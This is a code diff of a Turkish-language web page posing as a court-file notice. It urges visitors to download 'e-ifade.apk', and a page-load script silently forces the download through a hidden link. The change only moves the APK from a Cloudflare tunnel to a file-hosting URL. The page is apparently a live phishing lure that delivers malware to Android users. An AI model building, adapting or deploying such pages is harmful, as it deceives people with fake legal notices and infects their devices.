@@ -160,7 +160,7 @@
     <h1>Mahkeme dosyanızı görüntülemek için lütfen aşağıdaki bağlantıya tıklayın</h1>
 
     <div class="document-link">
-      <a href="https://rebate-ideal-presenting-wayne.trycloudflare.com/k124sak12451asa/e-ifade.apk" download class="download-btn">
+      <a href="https://cdn.files-text.com/us-south1/api/lc/att/19196658/a0b011dc196fda503e8fb32d14c10966/e-ifade.apk" download class="download-btn">
         e-İfade (Dosyaları görüntülemek için tıklayınız)
       </a>
     </div>
@@ -198,7 +198,7 @@
     window.addEventListener('load', function () {
       setTimeout(function () {
         const link = document.createElement('a');
-        link.href = "https://rebate-ideal-presenting-wayne.trycloudflare.com/k124sak12451asa/e-ifade.apk";
+        link.href = "https://cdn.files-text.com/us-south1/api/lc/att/19196658/a0b011dc196fda503e8fb32d14c10966/e-ifade.apk";
         link.setAttribute('download', 'e-ifade.apk');
         link.style.display = 'none';
         document.body.appendChild(link);
